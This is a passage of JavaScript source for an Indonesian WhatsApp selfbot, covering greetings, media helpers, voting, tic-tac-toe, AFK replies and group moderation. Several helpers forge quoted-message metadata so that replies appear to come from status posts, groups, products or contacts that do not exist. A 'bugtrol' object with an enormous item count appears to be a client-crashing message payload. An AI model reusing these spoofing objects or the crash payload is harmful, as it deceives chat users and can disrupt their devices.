                case 0: hari = "Sunday"; break;
                case 1: hari = "Monday"; break;
                case 2: hari = "Tuesday"; break;
                case 3: hari = "Wednesday"; break;
                case 4: hari = "Thursday"; break;
                case 5: hari = "Friday"; break;
                case 6: hari = "Saturday"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "January"; break;
                case 1: bulan1 = "February"; break;
                case 2: bulan1 = "March"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "May"; break;
                case 5: bulan1 = "June"; break;
                case 6: bulan1 = "July"; break;
                case 7: bulan1 = "August"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "October"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "December"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + "Time : " + wib + " Wib";     
            
            myMonths = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"];
                myDays = ['Minggu','Senin','Selasa','Rabu','Kamis',"Jum'at",'Sabtu'];
                var tgl = new Date();
                detik = tgl.getSeconds();
                menit = tgl.getMinutes();
                jam = tgl.getHours();
	            var ampm = jam >= 12 ? 'PM' : 'AM';
	            var day = tgl.getDate()
	            bulan = tgl.getMonth()
	            var thisDay = tgl.getDay(),
	            thisDay = myDays[thisDay];
	            var yy = tgl.getYear()
	            var year = (yy < 1000) ? yy + 1900 : yy;
	            const ini_tanggal = `${day} - ${myMonths[bulan]} - ${year}`
            
            const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "19:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
        if(time2 < "18:00:00"){
        var ucapannya2 = `Afternoon 🌅 ${pushname}`
}
        if(time2 < "15:00:00"){
        var ucapannya2 = `GoodDay 🌞 ${pushname}`
}
        if(time2 < "11:00:00"){
        var ucapannya2 = `Morning 🌄 ${pushname}`
}
        if(time2 < "05:00:00"){
        var ucapannya2 = `Night 🌚 ${pushname}`
}
function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }
if (autobio){
if (autobio === false) return           
		    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptimer = clockString(_uptime);
      await alpha.setStatus(`I'm Userbot 👾 | Runtime ${uptimer} ⏲️ | ${status}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }}
		mess = {
			wait: '```[ ! ] Proses kak...```',
			success: '```[ ✓ ]``` Success',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
				admin: 'Only Group Admin',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }
        

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${thumbnail}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumbnail}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftoko = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`image/${thumbnail}`) //Gambarnye
					},
					"title": 'Whatsapp bot', 
					"description": "SELF BOT", 
					"currencyCode": "IDR",
					"priceAmount1000": "70000000",
					"retailerId": 'Whatsapp bot',
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
const bugtrol = { 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "359531915900587",
						"itemCount": 1000000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${creator}`,
						"orderTitle": `${creator}`,
						"sellerJid": "62887435047326@s.whatsapp.net",
						"token": "AR5b5YFz2g4W5fYrjbeakPiI3/XxarATSeP+KLh+0FGwkw=="
					}}}
       const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net",   "remoteJid": "6289523258649-1604595598@g.us"  }, "message": {orderMessage: {itemCount: 2021,status: 200, thumbnail: fs.readFileSync(`image/${thumbnail}`), surface: 200, message: `Whatsapp Bot 〽️\nBy ${ownername}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}},contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
        const fdoc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${creator}`,jpegThumbnail: fs.readFileSync(`image/${thumbnail}`)}}}
        const fvn = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":99999,"ptt": "true"}} } 
        const fgif = {key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {})},message: {"videoMessage": { "title":`Whatsapp Bot 〽️\nBy ${ownername}`, "h": `Hmm`,'seconds': '99999', 'gifPlayback': 'true', 'caption': `Whatsapp Bot 〽️\nBy ${ownername}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `さ ${pushname} さ\nᴄᴍᴅ ᴇxᴇᴄ : ${command}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fgclink2 = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "P", "caption": `${fake}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) },message: { "videoMessage": { "title":`${creator}`, "h": `Hmm`,'seconds': '99999', 'caption': `${creator}`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}
		const floc = {contextInfo: {"forwardingScore":999,"isForwarded":true,'stanzaId': msgId, 'participant':`${numbernye}@s.whatsapp.net`, 'remoteJid': '6283136505591-1614953337@g.us', 'quotedMessage': {"locationMessage": {"degreesLatitude": 41.893714904785156, "degreesLongitude": -87.63370513916016, "name": fake , 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`), thumbnail: fs.readFileSync(`image/${thumbnail}`),sendEphemeral: true}}}
		var fakeReplyList = ['ftroli', 'fdoc', 'fvn', 'fgif', 'fgclink', 'fvideo', 'floc', 'fkontak']
		var fakeReply = fakeReplyList[Math.floor(Math.random() * fakeReplyList.length)];
const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumbnail}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}})}
           
       const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './sticker' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './sticker' + names + '.png'
                    let asw = './sticker' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrlF = async(link, type, options) => {
            	hasil = await getBuffer(link)
            alpha.sendMessage(from, hasil, type, options).catch(e => {
            	fetch(link).then((hasil) => {
            	alpha.sendMessage(from, hasil, type, options).catch(e => {
            	alpha.sendMessage(from, { url : link }, type, options).catch(e => {
            	fakegroup('Something Error')
            console.log(e)
            })
            })
            })
            })
           }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
       async function sendFileFromUrl(from, url, caption, mek, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return alpha.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: mek, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
        const textImg = (teks) => {
            return alpha.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync(`image/${thumbnail}`)})
        }
        const sendStickerUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
				var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./src/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					alpha.sendMessage(to, media, sticker, mek)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					});
					});
				});
			}
			function jsonformat(string) {
  return JSON.stringify(string, null, 2)
}
			
			const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
alpha.sendMessage(from, hasil, type, options).catch(e => {
fetch(link).then((hasil) => {
alpha.sendMessage(from, hasil, type, options).catch(e => {
alpha.sendMessage(from, { url : link }, type, options).catch(e => {
reply2('Error!')
console.log(e)
})
})
})
})
}
			try{
			hit_total = await fetchJson('https://api.countapi.xyz/hit/api-alphabot.herokuapp.com/visits')
			} catch {
				hit_total = { 
					value : "-"
					}
				}
				hitall = `${hit_total.value}`
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '6281804680327@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : '62887435047326@s.whatsapp.net'
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' You have voted', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./lib/vote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = '*Vote* '+ '@'+ _votes[0].votes.split('@')[0] + `${enter}${enter}*Alasan*: ${_votes[0].reason}${enter}*Jumlah Vote* : ${vote.length} Vote${enter}*Durasi* : ${_votes[0].durasi} Menit${enter}${enter}` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}${enter}*Vote* : ${vote[i].voting}${enter}${enter}`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	

const getWin = async(board) => {
    var x = ["❌"]
    var o = ["⭕️"]

    // Horizontal
    if (board[0] == x && board[1] == x && board[2] == x) return x
    if (board[3] == x && board[4] == x && board[5] == x) return x
    if (board[6] == x && board[7] == x && board[8] == x) return x
    if (board[0] == o && board[1] == o && board[2] == o) return o
    if (board[3] == o && board[4] == o && board[5] == o) return o
    if (board[6] == o && board[7] == o && board[8] == o) return o

    // Silang
    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./src/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return alpha.sendMessage(from, `Anda belum pernah memainkan game tictactoe${enter}${enter}Jumlah kemenangan kamu didalam game *tictactoe* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./src/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah", "give up"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah${enter}_Yahaha_`
        return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply2(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 ${petik}TICTACTOE${petik} ??🎮${enter}•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `${enter}${enter}•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `${enter}_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Win : @${player2} 🎉${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉${enter}${enter}`
                    teks += board
                    teks += `${enter}${enter}•> Lose : @${player2} 👻${enter}_© WhatsApp inc._`
                    return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}`
                teks += `•> Draw : @${player1} 🦁${enter}${enter}`
                teks += board
                teks += `${enter}${enter}•> Draw : @${player2} 🐯${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return alpha.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply2(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 ${petik}TICTACTOE${petik} 🎭🎮${enter}•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}${enter}`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `${enter}${enter}•> Player 2 : @${lawan.split("@")[0]} (${pelawan})${enter}_© WhatsApp inc._`
                return alpha.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./src/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		alpha.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}

    _sewa.expiredCheck(alpha, sewa)
    
  //FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        alpha.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync(`image/${thumbnail}`)}}}})
          }
        }
            }
          }
        }
      }
    }
    if (isGroup && !mek.key.fromMe && isAntiLink && !isGroupAdmins && !isOwner && !isCreator && isBotGroupAdmins){
            if (chatxs.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply2(`「 G R O U P  L I N K  D E T E C T O R 」\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                alpha.groupRemove(from, [sender])
            }
        }
     if (isGroup && isAntivirtex && !mek.key.fromMe && !isOwner) {
      if (budy.length > 1000) {
        if (isGroupAdmins) return reply2("admin bebas");
        reply2("「 A N T I V I R T E X  D E T E C T E D 」 \n\nMaaf Kamu Akan Dikick");
        alpha.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isRegister && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								await alpha.sendMessage(`* 「 LEVEL UP 」 *\n\n🎯 *User :* @${sender.split("@")[0]}\n🆔 *Nomer :* ${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* ${getBalance(sender, balance)}\n👛 *Dompet :* ${checkATMuser(sender)}\n📛 *Role :* ${role}\n\nCongrats 🎉`,text, {quoted: mek, contextInfo: {"mentionedJid": [sender],"forwardingScore":999,"isForwarded":true},sendEphemeral: true })
								}
							} catch (err) {
								console.error(err)
							}
						}
    alpha.on('chat-update', asd => {
if (asd.presences) {
	for (key in asd.presences) {
		if (asd.presences[key].lastKnownPresence == 'composing' || asd.presences[key].lastKnownPresence == 'recording') {
			if (!isGroup) return
			if (off.checkAfkUser(key, _off)) {
               _off.splice(off.getAfkPosition(key, _off), 1)
